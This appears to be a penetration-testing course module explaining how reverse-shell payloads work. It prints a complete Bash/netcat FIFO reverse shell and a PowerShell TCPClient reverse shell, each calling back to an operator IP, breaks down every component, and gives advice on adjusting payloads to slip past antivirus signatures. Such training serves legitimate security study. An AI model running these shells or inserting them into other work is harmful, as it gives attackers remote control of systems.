# Introduction to Payloads

A payload is the functional component of an exploit: the command or code that performs the intended action on the target system. From an offensive perspective, a payload establishes access or executes a desired effect; from a defensive perspective, the same code represents malicious activity to be detected and blocked. Understanding what a payload is actually doing at a code level, rather than treating it as opaque output from a framework, directly improves an operator's ability to adapt, troubleshoot, and evade defences when standard payloads are blocked.

## One-Liners Examined

The one-liners used in previous sections are payloads delivered manually. The platform determines the syntax: a Linux target receives a Bash-based payload; a Windows target receives a PowerShell-based one. Breaking each down component by component removes the mystery and makes adaptation straightforward.

### Netcat/Bash Reverse Shell

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

Each component serves a specific function in constructing a bidirectional shell over a TCP connection:

| Component | Function |
|---|---|
| `rm -f /tmp/f;` | Removes `/tmp/f` if it already exists; `-f` suppresses errors if the file is absent. The semicolon sequences the next command. |
| `mkfifo /tmp/f;` | Creates a [FIFO named pipe](https://man7.org/linux/man-pages/man7/fifo.7.html) at `/tmp/f`. A FIFO pipe allows two processes to communicate by treating the file as a persistent read/write channel rather than a standard file. |
| `cat /tmp/f \|` | Reads from the FIFO pipe and passes its contents as standard input to the next command in the pipeline. Because it is reading a FIFO with no EOF, `cat` blocks and waits continuously for new data. |
| `/bin/bash -i 2>&1 \|` | Spawns an interactive Bash shell (`-i`). `2>&1` merges the standard error stream into standard output so both are passed through the pipe to Netcat. |
| `nc 10.10.14.12 7777 > /tmp/f` | Opens an outbound Netcat connection to the operator's listener. Output from the Netcat connection is redirected back into `/tmp/f`, completing the loop: commands sent from the attack box enter the FIFO, are read by Bash, and the output is returned through Netcat. |

### PowerShell One-liner

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
  $sendback = (iex $data 2>&1 | Out-String);
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
};
$client.Close()"
```

| Component | Function |
|---|---|
| `powershell -nop -c` | Executes `powershell.exe` with no profile (`-nop`) and runs the script block passed via `-c`. Issuing this from `cmd.exe` is useful when exploiting an RCE vulnerability that grants `cmd.exe` access rather than a native PowerShell prompt. |
| `$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443)` | Creates a .NET `TCPClient` object and opens a TCP connection to the operator's listener on port 443. |
| `$stream = $client.GetStream()` | Assigns the network stream from the TCP connection to `$stream` using the [GetStream](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream) method, which enables bidirectional network communication. |
| `[byte[]]$bytes = 0..65535\|%{0}` | Initialises an empty 65,535-byte array to act as a buffer for incoming data from the stream. |
| `while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)` | Enters a loop that continuously reads incoming bytes from the network stream into the buffer. The loop runs as long as data is being received. |
| `$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)` | Decodes the raw bytes from the buffer into an [ASCII](https://en.wikipedia.org/wiki/ASCII) string so that the incoming data can be interpreted as a command. |
| `$sendback = (iex $data 2>&1 \| Out-String)` | Passes the decoded command to `Invoke-Expression` (`iex`), which executes it on the local system. Both standard output and standard error are captured and converted to a string via `Out-String`. |
| `$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '` | Constructs the shell prompt response by appending the current working directory path, producing output in the format `PS C:\path\to\dir>` to mimic a native PowerShell prompt. |
| `$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write(...); $stream.Flush()` | Encodes the response as ASCII bytes and writes it back to the TCP stream, returning the command output to the operator's listener. `Flush()` ensures the buffer is cleared and the data is sent immediately. |
| `$client.Close()` | Calls the [TcpClient.Close](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.close) method to terminate the TCP connection cleanly when the session ends. |

## Payloads as Scripts

The PowerShell one-liner above can be expressed as a fully structured `.ps1` script rather than a single compressed line. The **[Nishang](https://github.com/samratashok/nishang)** framework's `Invoke-PowerShellTcp.ps1` is a well-known example of this: it implements the same TCP socket logic in a reusable function that accepts parameters for IP address, port, and connection mode (reverse or bind). It additionally transmits the current username and computer name to the operator on connection, and handles errors explicitly using `try/catch` blocks rather than silently failing. The functional outcome is identical to the one-liner; the structured form is simply easier to read, modify, and extend.

## Payloads Take Different Shapes and Forms

The payloads covered in this section were constructed manually and delivered by direct execution. The available payload types and formats for any given target are governed by what is present on that system: the operating system, available command language interpreters, and installed runtimes. When Windows Defender blocked the PowerShell payload earlier in this module, it did so because the script block matched a known signature; understanding the code makes it possible to identify which specific component triggered the detection and adjust accordingly. Automated frameworks such as **[Metasploit Framework](https://www.metasploit.com/)** generate and deliver payloads as pre-packaged attack modules, removing the need to construct one-liners manually, and are explored in the next section.
